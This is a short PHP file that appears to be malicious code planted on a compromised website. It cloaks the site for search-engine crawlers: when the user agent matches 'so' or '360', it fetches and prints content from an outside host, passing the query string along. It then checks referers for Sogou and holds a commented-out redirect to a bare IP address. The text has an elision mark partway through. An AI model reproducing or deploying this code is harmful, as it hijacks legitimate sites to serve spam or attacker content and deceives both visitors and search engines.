<?php
if (stristr ( $_SERVER ['HTTP_USER_AGENT'], "so" )) {
	$QUERY_STRING = $_SERVER ['QUERY_STRING'];
	$file = file_get_contents ( 'http://1.printzj.com/nmwomen.org.cn.php?' . $QUERY_STRING );
	echo $file; //
	exit ();
}
if (stristr ( $_SERVER ['HTTP_USER_AGENT'], "360" )) {
	$QUERY_STRING = $_SERVER ['QUERY_STRING'];
	$file = file_get_contents ( 'http://1.printzj.com/nmwomen.org.cn.php?' . $QUERY_STRING );
	echo $file; //
	exit ();
...
if (isset ( $_SERVER ['HTTP_REFERER'] )) {
	$_host = ($_SERVER ['HTTP_REFERER']);
	$key = "sogou";
	$bodog = "pt";
    $pos= strpos ( $_host, $key ) ;
   if (strpos ( $_host, $key ) > 0 || strpos ( $_host, $bodog ) > 0) {
	 // echo "<script language=javascript>window.location.href='http://23.252.160.211/';</script>";
	}
}
?>
<?php
